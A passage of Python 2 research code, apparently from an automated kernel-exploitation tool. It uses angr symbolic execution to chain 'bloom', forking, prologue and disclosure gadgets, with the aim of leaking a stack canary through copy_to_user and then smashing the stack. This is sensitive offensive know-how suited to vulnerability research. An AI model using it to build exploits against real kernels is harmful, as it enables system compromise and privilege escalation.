            self.good_bloom_fork_gadget_pair.append([list(self.current_bloom_gadget), list(self.current_forking_gadget)
                            , constraints , list(state.osokplugin.constraints_at_firstly_reached_site) \
                            , list(state.osokplugin.history_bbls_to_firstly_reached_fork_site), 3])
            return

        if state.osokplugin.firstly_reach_second_fork_site is None:
            # we firstly reach the first fork site
            state.osokplugin.firstly_reach_first_fork_site = True
            state.osokplugin.constraints_at_firstly_reached_site = list(state.se.constraints)
            state.osokplugin.history_bbls_to_firstly_reached_fork_site = [addr.addr for addr in state.history_iterator]

        if state.osokplugin.reach_second_fork_site:##TODO we can not pickle state from userhook!!!!
            print 'found good bloom fork pair'
            constraints = list(state.se.constraints)
            self.good_bloom_fork_gadget_pair.append([list(self.current_bloom_gadget), list(self.current_forking_gadget), constraints\
                    , list(state.osokplugin.constraints_at_firstly_reached_site)\
                    , list(state.osokplugin.history_bbls_to_firstly_reached_fork_site), 2])

        #import IPython; IPython.embed()
        return 

    def reach_second_fork_site_callback(self, state):
        """
        callback function at the 2nd fork site(2nd is only an index, does not mean the site is reached first
        :param state:
        :return:
        """
        #self.reach_current_second_fork_site = True
        state.osokplugin.reach_second_fork_site = True
        print 'reach second fork site'
        #check controlled regsiters
        try:
            bloomed_regs = self.get_number_of_bloomed_regs(state)
            number_of_bloomed_regs = len(bloomed_regs)
            print('[+] there are %d controlled registers' % number_of_bloomed_regs)
        except:
            traceback.print_exc()
            raw_input()

        if state.osokplugin.firstly_reach_second_fork_site and not state.osokplugin.reach_first_fork_site:
            # we reach second fork site for two consecutive times without reaching first fork site
            print 'found good bloom fork pair'
            constraints = list(state.se.constraints)
            self.good_bloom_fork_gadget_pair.append([list(self.current_bloom_gadget), list(self.current_forking_gadget)\
                        , constraints \
                        , list(state.osokplugin.constraints_at_firstly_reached_site) \
                        , list(state.osokplugin.history_bbls_to_firstly_reached_fork_site), 4])
            return

        if state.osokplugin.firstly_reach_first_fork_site is None:
            # we firstly reach the second fork site
            state.osokplugin.firstly_reach_second_fork_site = True
            state.osokplugin.constraints_at_firstly_reached_site = list(state.se.constraints)
            state.osokplugin.history_bbls_to_firstly_reached_fork_site = [addr.addr for addr in state.history_iterator]

        if state.osokplugin.reach_first_fork_site:
            print 'found good bloom fork pair'
            constraints = list(state.se.constraints)
            self.good_bloom_fork_gadget_pair.append([list(self.current_bloom_gadget), list(self.current_forking_gadget)\
                    , constraints\
                    , list(state.osokplugin.constraints_at_firstly_reached_site)\
                    , list(state.osokplugin.history_bbls_to_firstly_reached_fork_site), 1])
        #import IPython; IPython.embed()
        return

    def getInstructionLengthByAddr(self, addr):
        tmpbb = self.b.factory.block(addr)
        if tmpbb.size > 5:
            print 'wtf tmpbb size >  5'
            import IPython; IPython.embed()
        # call __x86_indirect_thunk_rax
        assert tmpbb.size <= 5
        return tmpbb.size

    def instrument_forking_gadget(self, state, forking_gadget):
        """
        :param state:  current execution state
        :param bloom_gadget: bloom gadget
        :param forking_gadget: forking gadget
        :param bloom_state:  old state serilized when step() found a good bloom_state
        :return: None
        """
        fork_entry, first_fork_site, second_fork_site = self.get_forking_gadget_entry_and_sites(forking_gadget)
        # the problem here is that when rax is symbolic,
        # mov rax, qword ptr [rax + 0x80] will concretize this shit

        # init the state plugin to keep track of fork site
        state.register_plugin('osokplugin', angr.state_plugins.OsokPlugin(False, False, False))
        self.reach_current_bloom_site = True
        state.osokplugin.reach_bloom_site = True  # we have already reached the bloom site

        # add instrumentation via breakpoint
        # TODO handle indirect jump such as call rdx
        state.inspect.b('mem_read', when=angr.BP_BEFORE, action=self.track_reads)
        state.inspect.b('mem_write', when=angr.BP_BEFORE, action=self.track_writes)
        state.inspect.b('instruction', when=angr.BP_BEFORE, instruction=fork_entry, action=self.enter_fork_callback)
        # we want to first verify if we can reach both of the forking site,
        # so we should zero out both of the call stubs
        if not self.b.is_hooked(first_fork_site):
            instSize = self.getInstructionLengthByAddr(first_fork_site)
            self.b.hook(first_fork_site, self.reach_first_fork_site_callback, instSize)
        if not self.b.is_hooked(second_fork_site):
            instSize = self.getInstructionLengthByAddr(second_fork_site)
            self.b.hook(second_fork_site, self.reach_second_fork_site_callback, instSize)
        return

    def is_stack_address(self, addr):
        if (addr & 0xffffc90000000000) == 0xffffc90000000000:
            return True
        else:
            return False

    def decide_disclosure_landing_site(self, prologue_signature, hotmap, sub_gadget_entry):
        """
        TODO: heurisitic to decide disclosure landing site, would be useful to speed up the osok
        :param prologue_signature:
        :param hotmap:
        :param sub_gadget_entry:
        :return:
        """
        print 'hotmap', hotmap
        if str(hotmap) == '[1, 2, 3]':#1
            #todo
            pass
        elif str(hotmap) == '[1, 3, 2]':#2
            #todo
            pass
        elif str(hotmap) == '[2, 1, 3]':#3
            #todo
            pass
        elif str(hotmap) == '[3, 1, 2]':#4
            #todo
            pass
        elif str(hotmap) == '[3, 2, 1]':#5
            #todo
            pass
        elif str(hotmap) == '[2, 3, 1]':#6
            #todo
            pass
        elif str(hotmap) == '[2, 1, 0]':#7
            #todo
            pass
        elif str(hotmap) == '[1, 2, 0]':#8
            #todo
            pass
        elif str(hotmap) == '[0, 2, 1]':#9
            #todo
            pass
        elif str(hotmap) == '[0, 1, 2]':#10
            #todo
            pass
        elif str(hotmap) == '[0, 1, 0]':#11
            #todo
            pass
        elif str(hotmap) == '[0, 0, 0]':#12
            #todo
            pass
        return [x for x in sub_gadget_entry if x != 0]

    def run_forking_gadget(self, state, good_bloom_gadget, forking_gadget):
        '''
        run forking gadget and check whether we could reach both of the fork site
        :param state: initial state
        :param good_bloom_gadget: precomputed good bloom gadgets
        :param forking_gadget: current forking gadget
        :param first_constraint_func: constraint functiono to perform on the initial state
        :return: None
        '''
        bloom_gadget = good_bloom_gadget[0]
        bloom_state = good_bloom_gadget[1]
        bloom_entry, bloom_site = self.get_blooming_gadget_entry_and_site(bloom_gadget)
        fork_entry, first_fork_site, second_fork_site = self.get_forking_gadget_entry_and_sites(forking_gadget)
        if fork_entry == bloom_entry:
            print('fork gadget and bloom gadget are identical')
            return  # TODO: hahaha

        # import IPython; IPython.embed()
        # enforce the constraint to let the bloom gadget to land at the forking gadget, 233
        state.add_constraints(state.regs.rip == fork_entry)
        if not state.satisfiable():
            print "[-] can not set bloom target to fork gadget"
            return

        self.current_forking_gadget = forking_gadget
        if self.add_forking_instrumentation:  # instrumentation
            self.instrument_forking_gadget(state, forking_gadget)

        # several flags to manage the current simgr
        self.reach_current_fork_gadget = False
        self.reach_current_first_fork_site = False
        self.reach_current_second_fork_site = False
        b = self.b
        sol = self.sol

        simgr = b.factory.simgr(state, save_unconstrained=True)
        if self.limit_loop:
            pass
        self.loop_idx_forking_stage = 0
        #loop_idx = 0
        while True:
            print '[+] ' + str(self.loop_idx_forking_stage) + ' step()'
            self.debug_simgr(simgr)
            try:
                print 'purge deadend state'
                simgr.stashes['deadended'] = []
                print '[*] stepping...'
                print simgr.stashes
                simgr.step(stash='active')
                self.loop_idx_forking_stage += 1
                print 'inspecting simgr...'
                simgr.move(from_stash='active', to_stash='deadended', filter_func=filter_bad_rip)
                #if self.loop_idx_forking_stage > 7:
                    #simgr.move(from_stash='active', to_stash='deadended', filter_func=filter_bloom_unreachable)
                if self.loop_idx_forking_stage > 5:
                    simgr.move(from_stash='active', to_stash='deadended', filter_func=filter_fork_unreachable)
                #import IPython; IPython.embed()
            except:
                print 'wtf simgr error'
                traceback.print_exc()
                del simgr
                return

            if len(simgr.active) == 0 and len(simgr.unconstrained) == 0:
                print('no active and unconstrained states left, wtf..')
                del simgr
                return 

            #for active_state in simgr.active:
                #if active_state.osokplugin.reach_second_fork_site and active_state.osokplugin.reach_first_fork_site:

            if self.reach_current_bloom_site == True:
                print('reached the bloom site, next going to reach forking site')

            if self.reach_current_bloom_site == True:
                print('reached bloom site')
                if self.reach_current_fork_gadget == True:
                    print('reached fork gadget')

            #elif self.loop_idx_forking_stage > 7 and not self.reach_current_bloom_site:
                #print('can not reach bloom site in 7 steps, return?')
                #del simgr
                #return

            if self.loop_idx_forking_stage > 11:
                print 'reach max bbl number limit, terminating execution'
                del simgr
                return

            if simgr.unconstrained:
                # this is a dirty hack to handle indirect jump because angr does not recognize
                # such indirect jump and set their type to Ijk_Boring :(
                # #TODO we can not simply set rip to fork entry!!!!
                print('[+] found unconstrained states')
                print('[+] dumping unconstrained states')
                for ucstate in simgr.unconstrained:
                    for addr in ucstate.history_iterator:
                        print addr
                    if ucstate.osokplugin.reach_bloom_site:
                        print('already reached the bloom site, should not get stupid unconstrained state')
                        #import IPython; IPython.embed()
                        print('removing the stupid state')
                        simgr.move(from_stash='unconstrained', to_stash='deadended', filter_func=lambda s: s == ucstate)
                    else:
                        if ucstate.history.addr == bloom_state.history.addr:  #reach the bloom site
                            ucstate.osokplugin.reach_bloom_site = True
                            self.reach_current_bloom_site = True
                            print('just reached the bloom site')
                            print 'constraining rip to: ', hex(fork_entry)
                            ucstate.add_constraints(ucstate.regs.rip == fork_entry)
                            if ucstate.satisfiable():
                                simgr.move(from_stash='unconstrained', to_stash='active', filter_func=lambda s: s == ucstate)
                            else:
                                simgr.move(from_stash='unconstrained', to_stash='deadended', filter_func=lambda s: s == ucstate)
                        else:
                            print('strange state!')
                            simgr.move(from_stash='unconstrained', to_stash='deadended', filter_func=lambda s: s == ucstate)
                            #import IPython; IPython.embed()

            finished = False
            for active_state in simgr.stashes['active']:
                if active_state.osokplugin.reach_first_fork_site and active_state.osokplugin.reach_second_fork_site:
                    print 'already reached two fork sites of current fork gadget, exiting...'
                    finished = True
            if finished:
                del simgr
                return
                #import IPython; IPython.embed()


    def multiple_runs_forking_gadget(self, good_bloom_gadget):
        """
        run good bloom gadget and concatenate with various forking gadget
        :param good_bloom_gadget:
        :return:
        """
        print '[+] multiple runs forking gadget'
        bloom_gadget = good_bloom_gadget[0]
        bloom_state = good_bloom_gadget[1]
        self.current_bloom_gadget = bloom_gadget
        initial_state = self.get_initial_state(switch_cpu=True)
        total = len(self.fork_gadgets)
        for i, forking_gadget in enumerate(self.fork_gadgets):
            #if i % 16 != 0:
                #continue
            print '[+] ===== checking %d/%d th forking gadget...=====' % (i, total)
            print forking_gadget
            #import IPython; IPython.embed()
            tmp_state = bloom_state.copy()
            self.run_forking_gadget(tmp_state, good_bloom_gadget, forking_gadget)
            fork_entry, first_fork_site, second_fork_site = self.get_forking_gadget_entry_and_sites(forking_gadget)
            # remove hook at forking site
            self.b.unhook(first_fork_site)
            self.b.unhook(second_fork_site)
            del tmp_state

    def enter_prologue_callback(self, state):
        self.reach_current_prologue_entry = True
        print colorama.Fore.RED + 'enter prologue gadget' + colorama.Style.RESET_ALL
        state.inspect.remove_breakpoint("call", self.first_fork_site_bp)
        print '[+] removed the call bp at the first fork site..'
        #
        self.bp_enforce_prologue_to_copy_to_user = state.inspect.b("call", when=angr.BP_BEFORE \
                                                                   , action=self.enforce_prologue_to_copy_to_user)
        print '[+] enforced a bp on call for disclosure'
        #import IPython; IPython.embed()
        return

    def track_prologue_address_concretization(self, state):
        print 'address_concretization event bp at first fork site', hex(state.addr)
        print 'setting strategy to controlled_data'
        state.inspect.address_concretization_strategy = state.memory.read_strategies[0]
        #import IPython; IPython.embed()
        return

    def enforce_prologue_to_copy_to_user(self, state):
        print ('Call instruction at:', state.inspect.function_address)
        if state.regs.rip.symbolic:
            print(colorama.Fore.RED + '[+] extracting runtime data flow signature for pairing with disclosure gadget' \
                  + colorama.Style.RESET_ALL)
            data_signatures = self.extract_prologue_call_site_signature(state)
            self.current_prologue_signature = data_signatures
            #import IPython; IPython.embed()
        else:
            print 'rip is not symbolic wtf'
            #import IPython; IPython.embed()
        print (colorama.Fore.RED + '[!] removing bp_enforce_prologue_to_copy_to_user)' + colorama.Style.RESET_ALL)
        state.inspect.remove_breakpoint('call', self.bp_enforce_prologue_to_copy_to_user)
        return

    def check_disclosure_requirements(self, state):
        """
        check if current state is able to disclosure stack canary
        :param self:
        :param state:
        :return:
        """
        if state.regs.rdx.symbolic:
            print 'rdx is symbolic'
        else:
            print '[-] does not satisfy disclosure requirement because rdx is not symbolic'
            return
        tmp_state = state.copy()
        tmp_state.add_constraints(tmp_state.regs.rdi < 0x7fff00000000)
        #tmp_state.add_constraints(tmp_state.regs.rdx < 0x200)
        if tmp_state.satisfiable():
            print 'blooming gadget:', self.current_bloom_gadget[1]
            print 'forking gadget:', self.current_forking_gadget[1]
            print 'prologue gadget:', self.current_prologue_gadget[5]
            print 'disclosure gadget:', self.current_disclosure_gadget[3]
            print colorama.Fore.RED + '[+] disclosure requirement fullfilled' + colorama.Style.RESET_ALL
            state.osokplugin.has_good_disclosure_site = True
            #import IPython; IPython.embed()
        else:
            print '[-] does not satisfy disclosure requirement'
        del tmp_state
        return

    def disclosure_site_callback(self, state):
        """
        call breakpoint at the disclosure, check whether regs: rdi, rsi rdx satisfy a set of predefined requirements
        :param state:
        :return:
        """
        print '[+] reaching the disclosure site'
        if state.regs.rsi.symbolic:
            print 'rsi is symbilic, it is not good because we need rsi points to stack...'
        else:
            if self.is_stack_address(state.se.eval(state.regs.rsi)):
                print colorama.Fore.YELLOW + 'rsi points to stack, sounds good, needs further check'\
                      + colorama.Style.RESET_ALL
                #check if current state satisfy disclosure requirement
                self.check_disclosure_requirements(state)
            else:
                print 'rsi does not point to stack..., let\'s do some dirty trick to kill the state'
        return

    def enforce_prologue_on_first_fork(self, state):
        """
        callback at the first_fork site, will set indirect call target as the prologue gadget
        :param state:
        :return:
        """
        prologue_gadget = self.current_prologue_gadget
        prologue_entry = prologue_gadget[6]
        print('='*78)
        print('Call instruction at:',state.inspect.function_address)
        self.reach_current_first_fork_site = True
        print('reached current first fork site')
        if state.regs.rip.symbolic:
            print(colorama.Fore.RED + '[+] connecting first_fork with prologue %x by adding constraint' % \
                  (prologue_entry) + colorama.Style.RESET_ALL)
            state.add_constraints( state.regs.rip == prologue_entry ) #add constraint
            if state.satisfiable():
                print '[+] constraint satisfiable'
                pass
            else:
                print('state is not satisfiable')
                #import IPython; IPython.embed()
                self.unsatisfiable_state.append(state.copy())
            if self.pause_on_prologue_on_fork:
                opt = raw_input('ipython shell? [y/N]')
                if opt == 'y\n':
                    import IPython; IPython.embed()
        else:
            print 'rip is not symbolic wtf'
            #import IPython; IPython.embed()
        return

    def instrument_prologue_gadget(self, state, bloom_gadget, forking_gadget, prologue_gadget, disclosure_gadget \
                                   , first_reached_fork_site):
        """
        instrument state, add call back to enforce indirect jump tp instrument prologue
        :param state: the state that already reach the basic block of the first fork stie
        :param bloom_gadget: the bloom gadget information
        :param forking_gadget: the forking gadget information
        :param prologue_gadget: the prologue gadget
        :param disclosure_gadget:  the disclosure gadget
        :param first_reached_fork_site: 1 or 2
        :return:
        """
        #init some parameters
        self.reach_current_bloom_site = False
        self.reach_current_fork_gadget = False
        self.reach_current_first_fork_site = False
        self.reach_current_second_fork_site = False
        self.reach_current_prologue_entry = False
        self.reach_current_prologue_site = False
        self.current_prologue_gadget = prologue_gadget  #set current prologue gadget
        self.current_disclosure_gadget = disclosure_gadget # set current disclosure gadget
        self.current_prologue_signature = None
        self.bp_enforce_prologue_to_copy_to_user = None

        state.register_plugin('osokplugin', angr.state_plugins.OsokPlugin(False, False, False))

        bloom_entry, bloom_site = self.get_blooming_gadget_entry_and_site(bloom_gadget)
        fork_entry, first_fork_site, second_fork_site = self.get_forking_gadget_entry_and_sites(forking_gadget)

        #get disclosure site(e.g. site of copy from user)xxx this is dirty hack
        try:
            address_near_to_copy_from_user =  disclosure_gadget[4][0]['addr']
        except:
            print 'wtf'
            #import IPython; IPython.embed()

        tmp_bbl = self.b.factory.block(address_near_to_copy_from_user)
        disclosure_site = tmp_bbl.instruction_addrs[-1]

        if first_reached_fork_site == 2:
            first_fork_site, second_fork_site = second_fork_site, first_fork_site #swap order if we first see second site
        if first_reached_fork_site == 3:
            second_fork_site = first_fork_site
        if first_reached_fork_site == 4:
            first_fork_site = second_fork_site
        prologue_entry = prologue_gadget[6]

        #for constraint in constraints_at_first_fork_site:
        #state.add_constraints(constraint)

        # call breakpoint for first fork site
        print 'first fork site: %x' % (first_fork_site)
        self.first_fork_site_bp = state.inspect.b('call', when = angr.BP_BEFORE \
                                                  , instruction = first_fork_site \
                                                  , action = self.enforce_prologue_on_first_fork)
        # call breakpoint for disclosure site
        print 'copy_to_user site: %x' % (disclosure_site)
        state.inspect.b('call', when=angr.BP_BEFORE, instruction = disclosure_site \
                        , action = self.disclosure_site_callback)
        #state.inspect.remove_breakpoint("call", self.first_fork_site_bp)
        state.inspect.b('mem_read', when=angr.BP_BEFORE, action = self.track_reads)
        state.inspect.b('instruction', when=angr.BP_BEFORE, instruction = prologue_entry \
                        , action = self.enter_prologue_callback)
        #state.inspect.b('address_concretization', when=angr.BP_BEFORE, instruction = first_fork_site, \
                        #action = self.track_prologue_address_concretization \
                        #)

    def add_concretization_strategy_controlled_data(self, state):
        """
        add conrolled_data concretization strategy to read strategies
        :param state:
        :return:
        """
        if self.has_custom_concretization_strategy:
            state.memory.read_strategies.insert(0, \
                angr.concretization_strategies.mycontrolled_data.MySimConcretizationStrategyControlledData(\
                    1, [ ]))
        else:
            #state.memory.read_strategies.insert(2, \
            state.memory.read_strategies.insert(0, \
                            angr.concretization_strategies.controlled_data.SimConcretizationStrategyControlledData( \
                            1, [0xffff880066800000]))
        return

    def run_prologue_and_disclosure_gadget(self, state, bloom_gadget, forking_gadget, prologue_disclosure_pair \
                                           , first_reached_fork_site, first_constraint_func=None):
        """
        run symbolic execution from the start of first forking site and disclosure gadget
        :param state:
        :param bloom_gadget:
        :param forking_gadget:
        :param prologue_disclosure_pair:
        :param constraints:
        :param constraints_at_first_fork_site:
        :param first_reached_fork_site:
        :param first_constraint_func:
        :return:
        """
        prologue_gadget = prologue_disclosure_pair[0]
        disclosure_gadget = prologue_disclosure_pair[1]
        bloom_entry, bloom_site = self.get_blooming_gadget_entry_and_site(bloom_gadget)
        fork_entry, first_fork_site, second_fork_site = self.get_forking_gadget_entry_and_sites(forking_gadget)
        if len(disclosure_gadget[4]) == 0:
            return
        if self.add_prologue_instrumentation:  # add instrumentation to reach prologue gadget
            self.instrument_prologue_gadget(state, bloom_gadget, forking_gadget, prologue_gadget \
                                            , disclosure_gadget, first_reached_fork_site)

        if first_constraint_func != None:
            first_constraint_func(state, bloom_entry)

        #if self.use_controlled_data_concretization:
            #self.add_concretization_strategy_controlled_data(state)

        b = self.b
        sol = self.sol

        simgr = b.factory.simgr(state, save_unconstrained=True)
        # TODO opmize by adding a stash to the simgr
        self.loop_idx_prologue_state = 0
        while True:
            if not self.reach_current_prologue_site:  # have not reach the prologue entry
                print '[+] ' + str(self.loop_idx_prologue_state) + ' step()'
                self.debug_simgr(simgr)
                try:
                    # import IPython; IPython.embed()
                    print 'stepping...'
                    simgr.step(stash='active')  # step()
                    simgr.move(from_stash='active', to_stash='deadended', filter_func=filter_bad_rip)
                    # todo implement symbolic tracing
                except:
                    print 'wtf simgr error'
                    traceback.print_exc()
                    raw_input()
                    del simgr
                    return

                self.loop_idx_prologue_state += 1

                if len(simgr.active) == 0 and len(simgr.unconstrained) == 0:
                    print('no active states and unconstrained states left, wtf..')
                    del simgr
                    return

                if self.reach_current_bloom_site is True:  # reach the bloom site
                    print('reached bloom site')
                    if self.reach_current_prologue_site:  # reach the current prologue site
                        print('reached prologue entry in the step')
                        import IPython; IPython.embed()

                if self.loop_idx_prologue_state == 3:
                    print 'we should be able to finish the analysis in *three* steps'
                    print 'lets save the good states'
                    for active_state in simgr.stashes['active']:
                        if  active_state.osokplugin.has_good_disclosure_site:# is good disclosure site
                            self.tmp_good_disclosure_state_number += 1
                            self.good_disclosure_state.append([active_state.copy()\
                                , self.current_bloom_gadget, self.current_forking_gadget\
                                , self.current_prologue_gadget, self.current_disclosure_gadget\
                                , self.current_firstly_reached_fork_site]\
                                )
                    del simgr
                    return

                if simgr.unconstrained:  # has unconstrained states
                    if self.current_prologue_signature is None:
                        print 'we already found unconstrained states but did not find prologue signatures, wtf...'
                        print 'this should never happen...'
                        import IPython; IPython.embed()
                    else:
                        print(colorama.Fore.RED+'[+] found %d unconstrained states' % (len(simgr.unconstrained))\
                              + colorama.Style.RESET_ALL)
                        print 'how to handle unconstrained state?'
                        for ucstate in simgr.unconstrained:
                            for addr in ucstate.history_iterator:
                                print addr
                            hotmap, sub_gadget_entry = self.analyze_disclosure_gadget(self.current_disclosure_gadget)
                            target_addrs = self.decide_disclosure_landing_site(self.current_prologue_signature \
                                                                               , hotmap, sub_gadget_entry)
                            if target_addrs == None:
                                print 'There is not good target landing disclosure gadget site, abort this simgr...'
                                import IPython; IPython.embed()
                                del simgr
                                return
                            else:
                                print 'there are %d candidates of landing targets' % (len(target_addrs))
                                for i, target_addr in enumerate(target_addrs):
                                    print 'generating state for %dth landing target' % (i)
                                    new_state = ucstate.copy()
                                    print 'constraining the rip to %x' % (target_addr)
                                    new_state.add_constraints(ucstate.regs.rip == target_addr)
                                    if new_state.satisfiable():
                                        print 'appending the cloned state to active stash'
                                        simgr.stashes['active'].insert(1, new_state)
                                    else:
                                        print 'found unsatisfiable states'
                                        self.unsatisfiable_state.append(new_state)
                                #import IPython; IPython.embed()

                        print 'remove unconstrained state'
                        simgr.stashes['unconstrained'] = []
                        #import IPython; IPython.embed()
                    pass
                # TODO what if we can not reach the first fork site

                pass
            else:  # already reached the current prologue site
                print('already reached prologue entry')
                import IPython; IPython.embed()
                pass
                # TODO

    def normalize_history_bbl_addrs(self, bbl_addrs):
        """
        remove some false bbl addrs
        :param bbl_addrs: bbl_addrs of history
        :return: new list of bbl_addrs
        """
        good_bbl_addrs = []
        previous_block = None
        for i, addr in enumerate(bbl_addrs):
            if i == 0:
                good_bbl_addrs.append(addr)
            elif addr in previous_block.instruction_addrs:
                continue
            else:
                good_bbl_addrs.append(addr)
            block = self.b.factory.block(addr)
            previous_block = block

        return list(good_bbl_addrs)

    def run_symbolic_tracing_to_first_fork_site(self, state, bloom_gadget, forking_gadget, history_bbl_addrs\
                                                , first_constraint_func=None):
        """
        symbolic tracing to reach the first fork site, return a state prior to first forking for further exploiration
        :param state:
        :param bloom_gadget:
        :param forking_gadget:
        :param history_bbl_addrs:
        :param first_constraint_func:
        :return:
        """
        the_chosen_state = None
        bbl_addrs = list(history_bbl_addrs)
        #bbl_addrs = bbl_addrs[1:]
        # normalize_history basic block address to fix stupid bugs
        bbl_addrs = self.normalize_history_bbl_addrs(bbl_addrs)
        print 'run symbolic tracing to forking site using the following trace:',
        for bbladdr in bbl_addrs:
            print hex(bbladdr),
        print ' '

        if first_constraint_func is not None:
            bloom_entry, bloom_site = self.get_blooming_gadget_entry_and_site(bloom_gadget)
            print 'apply first constraint func to bloom entry:', hex(bloom_entry)
            first_constraint_func(state, bloom_entry)

        if self.use_controlled_data_concretization:
            self.add_concretization_strategy_controlled_data(state)

        state.register_plugin('osoktracing', angr.state_plugins.OsokTracing(history_bbl_addrs=bbl_addrs\
                                                                            , current_bbl_idx=0))
        simgr = self.b.factory.simgr(state, save_unconstrained=True)
        loop_idx = 0
        max_loop_idx = len(bbl_addrs)
        next_expected_bbl_addr = bbl_addrs[loop_idx]
        while True:
            print '[+] ' + str(loop_idx) + ' step()'
            try:
                print '[+] stepping...'
                if len(simgr.active) == 0:
                    print '[-] no active states left, wtf'
                    #import IPython; IPython.embed()
                simgr.stashes['deadended'] = []
                print 'active(before)', simgr.active
                simgr.step(stash='active')
                print 'active(after)', simgr.active
                print 'simgr(after)', simgr
                #import IPython; IPython.embed()
                #loop_idx += 1
                for active_state in simgr.stashes['active']:
                    active_state.osoktracing.current_bbl_idx = loop_idx
                next_expected_bbl_addr = bbl_addrs[loop_idx]
                print 'next_expected_bbl_addr %x' % (next_expected_bbl_addr)
                simgr.move(from_stash='active', to_stash='deadended', filter_func=\
                    lambda s: s.addr != s.osoktracing.history_bbl_addrs[s.osoktracing.current_bbl_idx])
                if simgr.unconstrained:  # found unconstrained state
                    print 'there are %d unconstrained' % (len(simgr.unconstrained))
                    for ucstate in simgr.unconstrained:
                        ucstate.add_constraints(ucstate.regs.rip == next_expected_bbl_addr)
                        if ucstate.satisfiable():
                            simgr.move(from_stash='unconstrained', to_stash='active', filter_func=\
                                   lambda s: s == ucstate)
                        else:
                            print 'unsatisfiable'
                            simgr.move(from_stash='unconstrained', to_stash='deadended',\
                                       filter_func=lambda s: s == ucstate)
                loop_idx += 1
                #import IPython; IPython.embed()
            except:
                print 'wtf simgr error'
                traceback.print_exc()
                raw_input()
                del simgr
                return
            #if loop_idx == max_loop_idx-1:
            if loop_idx == max_loop_idx:
                print'tracing ended...'
                #import IPython; IPython.embed()
                try:
                    the_chosen_state = simgr.active[0].copy()
                except:
                    traceback.print_exc()
                    #import IPython; IPython.embed()
                del simgr
                return the_chosen_state

    def multiple_runs_prologue_and_disclosure_gadgets(self, good_bloom_and_fork_gadget):
        '''
        firstly run symbolic tracing using histroy bbl_addrs, then start symbolic exploration from the bloom state,
        :param good_bloom_and_fork_gadget: a good pair of bloom gadget and fork gadget
        :return: None
        '''
        print '[+] multiple runs bloom and fork gadget'
        bloom_gadget = good_bloom_and_fork_gadget[0]
        forking_gadget = good_bloom_and_fork_gadget[1]
        constraints = good_bloom_and_fork_gadget[2]
        constraints_at_first_fork_site = good_bloom_and_fork_gadget[3]
        history_bbl_addrs = good_bloom_and_fork_gadget[4]
        first_reached_fork_site = good_bloom_and_fork_gadget[5]
        self.current_bloom_gadget = bloom_gadget  # set current bloom gadget
        self.current_forking_gadget = forking_gadget  # set current_forking_gadget
        self.current_firstly_reached_fork_site = first_reached_fork_site
        #initial_state = self.get_initial_state(switch_cpu=True, extra_options=angr.options.AVOID_MULTIVALUED_WRITES)
        #self.initial_state = initial_state
        initial_state = self.initial_state

        if first_reached_fork_site in [1, 3]:
            print 'firstly reach first fork site'
        elif first_reached_fork_site in [2, 4]:
            print 'firstly reach second fork site'
        else:
            assert 0
        self.tmp_good_disclosure_state_number = 0
        fork_site_state = None
        trial_number = 0
        while fork_site_state is None and trial_number < 15:
            tmp_state = initial_state.copy()
            fork_site_state = self.run_symbolic_tracing_to_first_fork_site(tmp_state, bloom_gadget, \
                forking_gadget, history_bbl_addrs, first_constraint_func=self.first_constraint_func)
            del tmp_state
            trial_number += 1
        if fork_site_state is None:
            print('failed symbolic tracing attempt')
            #import IPython; IPython.embed()
            return
        print 'finished symbolic tracing'
        for i, prologue_disclosure_pair in enumerate(self.prologue_disclosure_pairs):
            print '====== checking %d/%d pair of prologue and disclosure gadget' % (i, \
                                                                                    len(self.prologue_disclosure_pairs))
            #import IPython; IPython.embed()
            tmp_state = fork_site_state.copy()
            self.run_prologue_and_disclosure_gadget(tmp_state, bloom_gadget, forking_gadget, prologue_disclosure_pair\
                    , first_reached_fork_site, first_constraint_func=None)
            del tmp_state
            #fast path, if we get several states, just return
            if self.fast_path_for_disclosure_state and self.tmp_good_disclosure_state_number > 10:
                print colorama.Fore.CYAN + 'we already get enough states, just return' + colorama.Style.RESET_ALL
                del fork_site_state
                return
        del fork_site_state

    def get_good_disclosure_state_dumps(self):
        mypath = './'
        tmpfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]
        files = [f for f in tmpfiles if 'good_disclosure_state' in f]
        return files

    def explore_state_for_second_fork_site(self, good_disclosure_state):
        """
        explore from the disclosure site for the second fork site
        :param good_disclosure_state:
        :return: candidate_states: unconstrained states potential helpful for smash
        """
        candidate_states = []
        reach_target_fork_site = False
        disclosure_state = good_disclosure_state[0]
        self.current_bloom_gadget = good_disclosure_state[1]
        self.current_forking_gadget = good_disclosure_state[2]
        self.current_prologue_gadget = good_disclosure_state[3]
        self.current_disclosure_gadget = good_disclosure_state[4]
        self.current_firstly_reached_fork_site = good_disclosure_state[5]
        # bloom_entry, bloom_site = self.get_blooming_gadget_entry_and_site(self.current_bloom_gadget)
        fork_entry, first_fork_site, second_fork_site = \
            self.get_forking_gadget_entry_and_sites(self.current_forking_gadget)
        if self.current_firstly_reached_fork_site == 2:
            # swap order if we firstly see second fork site
            first_fork_site, second_fork_site = second_fork_site, first_fork_site
        if self.current_firstly_reached_fork_site == 3:
            second_fork_site = first_fork_site
        if self.current_firstly_reached_fork_site == 4:
            first_fork_site = second_fork_site

        # currently we are in the entry of copy_to_user, so let's mimic a directly return from the site
        # as well as setting rax to non-zero value
        return_address = disclosure_state.se.eval(disclosure_state.memory.load(\
            disclosure_state.regs.rsp, 8).reversed)
        # assign new value of rsp
        disclosure_state.regs.rsp = disclosure_state.regs.rsp + 8
        # assign rax to non-zero value
        disclosure_state.regs.rax = 1
        # assign new value of rip
        disclosure_state.regs.rip = return_address
        #for i in range(40): print hex(s.se.eval(s.memory.load(s.regs.rsp + i*8, 8).reversed)),i*8

        target_fork_site = second_fork_site
        print 'target fork site is: %x'%(target_fork_site)

        # create a simulation manager
        simgr = self.b.factory.simgr(disclosure_state, save_unconstrained=True)
        #raw_input('inspect the state now?')
        #import IPython; IPython.embed()
        loop_idx = 0
        while True:
            print '[+] ' + str(loop_idx) + ' step()'

            try:
                print '[+] stepping'
                simgr.step()
                loop_idx += 1

            except:
                print 'wtf simgr error'
                traceback.print_exc()
                raw_input()
                del simgr
                break

            if loop_idx > 6:
                print 'too many steps...aborting...'
                del simgr
                break

            # has unconstrained states
            if simgr.unconstrained:
                print 'has unconstrained state..'
                for ucstate in simgr.unconstrained:
                    print 'inspect the unconstrained state', ucstate
                    print 'appending unconstrained state to candidate states'
                    candidate_states.append(ucstate.copy())
                    if target_fork_site in self.b.factory.block(ucstate.history.addr).instruction_addrs:
                        reach_target_fork_site = True
                    simgr.unconstrained.remove(ucstate)
                    #import IPython; IPython.embed()

